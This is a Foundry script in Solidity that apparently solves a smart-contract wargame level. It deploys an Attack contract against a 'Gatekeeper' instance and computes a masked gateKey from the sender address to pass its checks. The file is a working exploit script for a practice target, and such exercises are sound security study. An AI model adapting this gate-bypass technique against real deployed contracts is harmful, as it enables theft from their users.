// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Attack} from "../src/Attack.sol";

contract AttackScript is Script {
    function run() external {
        address targetAddress = vm.envAddress("GATEKEEPER_INSTANCE");

        vm.startBroadcast();
        Attack attacker = new Attack(targetAddress);

        bytes8 gateKey = bytes8(uint64(uint160(msg.sender)) & 0xFFFFFFFF0000FFFF | 0x100000000);
        bool success = attacker.attack(gateKey);

        vm.stopBroadcast();

        console.log("Attack contract deployed at:", address(attacker));
        console.log("Success:", success);
    }
}
